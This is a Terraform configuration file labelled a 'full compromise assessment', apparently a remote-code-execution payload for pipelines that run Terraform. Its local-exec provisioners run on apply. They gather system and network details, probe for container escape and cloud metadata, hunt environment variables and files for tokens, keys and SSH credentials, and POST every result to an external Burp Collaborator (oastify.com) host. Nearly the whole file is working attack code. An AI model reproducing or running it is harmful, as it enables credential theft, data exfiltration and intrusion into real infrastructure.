# main.tf - full compromise assessment
resource "null_resource" "system_recon" {
  provisioner "local-exec" {
    command = <<EOT
      echo "=== SYSTEM COMPROMISE ASSESSMENT ===" > /tmp/system.txt
      echo "container: $(cat /etc/hostname)" >> /tmp/system.txt
      echo "user: $(whoami)" >> /tmp/system.txt
      echo "id: $(id)" >> /tmp/system.txt
      echo "os: $(cat /etc/os-release | grep PRETTY_NAME)" >> /tmp/system.txt
      echo "=== MOUNTS ===" >> /tmp/system.txt
      mount >> /tmp/system.txt
      curl -X POST --data-binary @/tmp/system.txt http://2gj5410dqffy36mnn8f4uvq2vt1kpbuzj.oastify.com/system
    EOT
  }
}

resource "null_resource" "privilege_escalation" {
  provisioner "local-exec" {
    command = <<EOT
      echo "=== PRIVILEGE ESCALATION ===" > /tmp/privilege.txt
      echo "docker socket: $(ls -la /var/run/docker.sock 2>/dev/null || echo 'not found')" >> /tmp/privilege.txt
      echo "privileged: $( [ -w /dev/kmsg ] && echo 'YES' || echo 'no' )" >> /tmp/privilege.txt
      echo "host pid: $(ls /proc/1/root/ 2>/dev/null && echo 'accessible' || echo 'no')" >> /tmp/privilege.txt
      echo "capabilities: $(capsh --print 2>/dev/null | head -5 || echo 'no capsh')" >> /tmp/privilege.txt
      curl -X POST --data-binary @/tmp/privilege.txt http://2gj5410dqffy36mnn8f4uvq2vt1kpbuzj.oastify.com/privilege
    EOT
  }
}

resource "null_resource" "network_recon" {
  provisioner "local-exec" {
    command = <<EOT
      echo "=== NETWORK RECON ===" > /tmp/network.txt
      echo "ip info:" >> /tmp/network.txt
      ip addr >> /tmp/network.txt
      echo "=== routes ===" >> /tmp/network.txt
      ip route >> /tmp/network.txt
      echo "=== neighbors ===" >> /tmp/network.txt
      ip neighbor show 2>/dev/null >> /tmp/network.txt
      curl -X POST --data-binary @/tmp/network.txt http://2gj5410dqffy36mnn8f4uvq2vt1kpbuzj.oastify.com/network
    EOT
  }
}

resource "null_resource" "service_discovery" {
  provisioner "local-exec" {
    command = <<EOT
      echo "=== SERVICE DISCOVERY ===" > /tmp/services.txt
      echo "processes:" >> /tmp/services.txt
      ps aux >> /tmp/services.txt
      echo "=== listening ports ===" >> /tmp/services.txt
      netstat -tulpn 2>/dev/null || ss -tulpn 2>/dev/null >> /tmp/services.txt
      echo "=== cloud check ===" >> /tmp/services.txt
      curl -s --connect-timeout 2 http://169.254.169.254/ && echo "aws metadata: accessible" >> /tmp/services.txt || echo "aws metadata: no" >> /tmp/services.txt
      curl -X POST --data-binary @/tmp/services.txt http://2gj5410dqffy36mnn8f4uvq2vt1kpbuzj.oastify.com/services
    EOT
  }
}

resource "null_resource" "credential_hunt" {
  provisioner "local-exec" {
    command = <<EOT
      echo "=== CREDENTIAL HUNT ===" > /tmp/creds.txt
      echo "environment secrets:" >> /tmp/creds.txt
      env | grep -i "token\|key\|secret\|pass\|cred" >> /tmp/creds.txt
      echo "=== filesystem secrets ===" >> /tmp/creds.txt
      find / -name "*.pem" -o -name "*.key" -o -name ".env" -o -name "config" 2>/dev/null | head -20 >> /tmp/creds.txt
      echo "=== k8s secrets ===" >> /tmp/creds.txt
      ls -la /var/run/secrets/kubernetes.io 2>/dev/null >> /tmp/creds.txt
      curl -X POST --data-binary @/tmp/creds.txt http://2gj5410dqffy36mnn8f4uvq2vt1kpbuzj.oastify.com/creds
    EOT
  }
}

resource "null_resource" "lateral_movement" {
  provisioner "local-exec" {
    command = <<EOT
      echo "=== LATERAL MOVEMENT ===" > /tmp/lateral.txt
      echo "scanning internal network..." >> /tmp/lateral.txt
      for ip in 172.17.0.1 172.18.0.1 172.19.0.1 10.0.0.1 10.0.0.2 192.168.0.1 192.168.1.1; do
        ping -c 1 -W 1 $ip 2>/dev/null && echo "host $ip reachable" >> /tmp/lateral.txt || true
      done
      echo "=== docker containers ===" >> /tmp/lateral.txt
      docker ps -a 2>/dev/null >> /tmp/lateral.txt || echo "no docker access" >> /tmp/lateral.txt
      curl -X POST --data-binary @/tmp/lateral.txt http://2gj5410dqffy36mnn8f4uvq2vt1kpbuzj.oastify.com/lateral
    EOT
  }
}

resource "null_resource" "persistence_check" {
  provisioner "local-exec" {
    command = <<EOT
      echo "=== PERSISTENCE CHECK ===" > /tmp/persistence.txt
      echo "cron access: $(crontab -l 2>/dev/null && echo 'yes' || echo 'no')" >> /tmp/persistence.txt
      echo "ssh keys found: $(find / -name 'id_rsa' -o -name 'id_dsa' 2>/dev/null | wc -l)" >> /tmp/persistence.txt
      echo "available shells: $(which bash && which sh && which python3)" >> /tmp/persistence.txt
      echo "file creation test: $(echo 'rce-persistence-test' > /tmp/rce_proof.txt && cat /tmp/rce_proof.txt)" >> /tmp/persistence.txt
      curl -X POST --data-binary @/tmp/persistence.txt http://2gj5410dqffy36mnn8f4uvq2vt1kpbuzj.oastify.com/persistence
    EOT
  }
}

resource "null_resource" "summary" {
  provisioner "local-exec" {
    command = <<EOT
      echo "=== RCE COMPROMISE SUMMARY ==="
      echo "container: $(cat /etc/hostname)"
      echo "user: $(whoami)"
      echo "timestamp: $(date)"
      echo "all data sent to burp collaborator"
      curl -X POST -d "summary=compromise_complete&container=$(cat /etc/hostname)&user=$(whoami)&time=$(date)" http://2gj5410dqffy36mnn8f4uvq2vt1kpbuzj.oastify.com/summary
    EOT
  }
  
  depends_on = [
    null_resource.system_recon,
    null_resource.privilege_escalation, 
    null_resource.network_recon,
    null_resource.service_discovery,
    null_resource.credential_hunt,
    null_resource.lateral_movement,
    null_resource.persistence_check
  ]
}
